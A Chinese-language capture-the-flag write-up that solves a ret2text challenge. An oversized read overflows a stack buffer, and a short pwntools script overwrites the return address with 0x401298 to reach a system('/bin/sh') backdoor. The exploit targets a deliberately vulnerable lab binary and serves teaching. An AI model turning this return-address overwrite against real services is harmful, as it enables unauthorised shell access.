# 永远进不去的后门

## 题目简述

这是一个基础 ret2text 题。`input` 是栈上的 `int input[0x10]`，程序却使用 `read(0, input, 0x100)` 读取 256 字节，造成栈溢出。正常分支要求 `input[2] % 2023 == 2023`，而余数不可能等于除数，因此需要覆盖返回地址，直接跳到执行 `system("/bin/sh")` 的代码。

## 解题过程

二进制关闭 PIE 和栈保护，代码地址固定。通过反汇编定位后门分支中调用 `system` 的起始地址为 `0x401298`，再用 cyclic pattern 或分析栈帧可知，从 `input` 起始位置到保存的返回地址偏移为 `0x48`。

本地验证脚本如下；连接远端时只需把 `process()` 换成题目给出的 `remote()` 参数：

```python
from pwn import *

context(arch="amd64", os="linux")
io = process("../dist/ret2text")

offset = 0x48
backdoor = 0x401298
payload = b"A" * offset + p64(backdoor)

io.send(payload)
io.interactive()
```

函数执行 `ret` 时会从被覆盖的位置取出 `0x401298`，从而绕过永远无法成立的取模条件并进入后门。

## 方法总结

ret2text 的关键是确认三件事：输入函数是否能越界、返回地址的准确偏移，以及目标代码地址是否稳定。本题漏洞函数是带超长长度参数的 `read`，不是 `gets`；分析 WP 时应以源码和反汇编为准，避免仅凭常见题型套用结论。
